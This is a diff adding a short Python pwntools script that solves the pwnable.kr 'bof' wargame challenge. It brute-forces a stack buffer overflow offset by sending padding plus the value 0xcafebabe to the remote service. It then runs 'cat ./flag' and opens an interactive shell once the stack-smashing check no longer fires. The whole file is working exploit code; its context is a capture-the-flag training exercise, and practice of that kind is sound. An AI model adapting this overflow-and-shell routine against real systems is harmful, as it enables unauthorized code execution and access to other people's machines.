@@ -1,0 +1,17 @@
+#BOF-pwnable.kr :)
+
+from pwn import *
+
+
+for i in range(32,100):
+        p= remote("pwnable.kr","9000")
+        p.sendline("A"*i+"\xca\xfe\xba\xbe"[::-1])
+        p.sendline("cat ./flag")
+        e=(p.recv())
+
+        print(i,e)
+        if '*** stack smashing detected ***' not in e:
+                print("OFFSET is ",i)
+                p.sendline("cat ./flag")
+                p.interactive()
+                break
